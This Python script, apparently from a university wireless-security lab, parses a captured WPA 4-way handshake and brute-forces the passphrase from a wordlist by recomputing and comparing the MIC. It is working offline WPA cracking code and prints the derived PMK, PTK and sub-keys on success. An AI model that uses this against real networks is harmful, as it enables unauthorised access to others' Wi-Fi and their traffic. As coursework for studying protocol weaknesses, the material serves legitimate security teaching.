#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__ = "Caroline Monthoux, Rémi Poulard"
__copyright__ = "Copyright 2020, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__email__ = "caroline.monthoux@heig-vd.ch, remi.poulard@heig-vd.ch"
__status__ = "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex

from scapy.layers.dot11 import *
from scapy.layers.eap import EAPOL

from files.pbkdf2 import *
import hmac, hashlib


def customPRF512(key, A, B):
    """
    This function computes the key expansion from the 256 bit PMK to the 512 bit PTK.
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]


def find_ssid(packets):
    """
        Loop on all packets and try to find a Beacon frame to retrieve the SSID name.
    """
    for packet in packets:
        if Dot11Beacon in packet:
            return packet.info.decode()
    return ""


def format_mac(mac):
    """
        Format a MAC address from aa:bb:cc format to aabbcc format.
    """
    return mac.replace(":", "")


def get_ap_mac(packets):
    """
        Loop on all packets and try to find a Beacon frame to get the sender address of the frame.
        It should be the AP address.
    """
    for packet in packets:
        if Dot11Beacon in packet:
            return packet.addr2
    return ""


def get_client_mac(packets, ap_mac):
    """
        Loop on all packets and try to find Auth packets. Take the first one and extract the client 
        address, only if the packet was sent to our AP.
    """
    for packet in packets:
        # If it is an auth packet, and it is the first of the two auth packet, and our AP is the recipient,
        # then we get the client MAC address
        if Dot11Auth in packet and packet[Dot11Auth].seqnum == 1 and a2b_hex(format_mac(packet.addr1)) == ap_mac:
            return packet.addr2
    return ""


def get_nonce(packets, source):
    """
        Loop on all packets and try to find EAPOL packets. We check that the packet is the first or
        the second packet of the exchange (Nonce exchange). The nonce must be sent by the 'source'.
    """
    for packet in packets:
        if EAPOL in packet and a2b_hex(format_mac(packet.addr2)) == source and (b2a_hex(packet[Raw].load[1:3]).decode() == "008a" or b2a_hex(packet[Raw].load[1:3]).decode() == "010a"):
            return packet[Raw].load[13:45]
    return ""


def get_mic(packets):
    """
        Loop on all packets and try to find the 4th packet of the EAPOL exchange.
        Then extract the MIC of the packet.
    """
    for packet in packets:
        if EAPOL in packet and b2a_hex(packet[Raw].load[1:3]).decode() == "030a":
            return packet[Raw].load[77:93]
    return ""


def get_data(packets):
    """
        Loop on all packets and try to find the 4th packet of the EAPOL exchange.
        Then extract the data (MIC is removed, replaced by 0).
    """
    for packet in packets:
        if EAPOL in packet and b2a_hex(packet[Raw].load[1:3]).decode() == "030a":
            return linehexdump(packet[EAPOL], 0, 1, True).replace(" ", "").lower()[:162] + "0" * 32 + "0" * 4

def get_algo(packets):
    """
        Loop on all packets and ry to get the algorithm used. This info is in the first EAPOL packet
    """
    for packet in packets:
        if EAPOL in packet and b2a_hex(packet[Raw].load[1:3]).decode() == "008a":
            return hashlib.sha1 if int(bin(packet[Raw].load[2])[-2:], 2) == 2 else hashlib.md5

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa = rdpcap("wpa_handshake.cap")

# Important parameters for key derivation - most of them can be obtained from the pcap file
A = "Pairwise key expansion"  # this string is used in the pseudo-random function

ssid = find_ssid(wpa)
APmac = a2b_hex(format_mac(get_ap_mac(wpa)))
Clientmac = a2b_hex(format_mac(get_client_mac(wpa, APmac)))

# Authenticator and Supplicant Nonces
ANonce = get_nonce(wpa, APmac)
SNonce = get_nonce(wpa, Clientmac)

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
mic_to_test = b2a_hex(get_mic(wpa)).decode()

B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce, SNonce)  # used in pseudo-random function
data = a2b_hex(get_data(wpa))
algo = get_algo(wpa)
print("\n\nValues used to derivate keys")
print("============================")
print("SSID: ", ssid, "\n")
print("AP Mac: ", b2a_hex(APmac), "\n")
print("CLient Mac: ", b2a_hex(Clientmac), "\n")
print("AP Nonce: ", b2a_hex(ANonce), "\n")
print("Client Nonce: ", b2a_hex(SNonce), "\n")

f = open("passwords.txt", "r")
print("Starting to brutforce passphrase")
print("=============================\n")
for x in f:
    passPhrase = str.encode(x.strip('\n'))

    # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    pmk = pbkdf2(hashlib.sha1, passPhrase, ssid.encode(), 4096, 32)

    # expand pmk to obtain PTK
    ptk = customPRF512(pmk, str.encode(A), B)

    # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
    mic = hmac.new(ptk[0:16], data, algo)

    # if the mix extracted from the capture and the MIC generated are the same that mean that we found the passphrase
    if mic_to_test == mic.hexdigest()[:-8]:

        print("PASSPHRASE FOUND !\n")
        print("Passphrase:\t\t", x)
        print("\nResults of the key expansion")
        print("=============================")
        print("PMK:\t\t", pmk.hex(), "\n")
        print("PTK:\t\t", ptk.hex(), "\n")
        print("KCK:\t\t", ptk[0:16].hex(), "\n")
        print("KEK:\t\t", ptk[16:32].hex(), "\n")
        print("TK:\t\t", ptk[32:48].hex(), "\n")
        print("MICK:\t\t", ptk[48:64].hex(), "\n")
        print("MIC:\t\t", mic.hexdigest(), "\n")

        exit()

print("No passphrase found !")
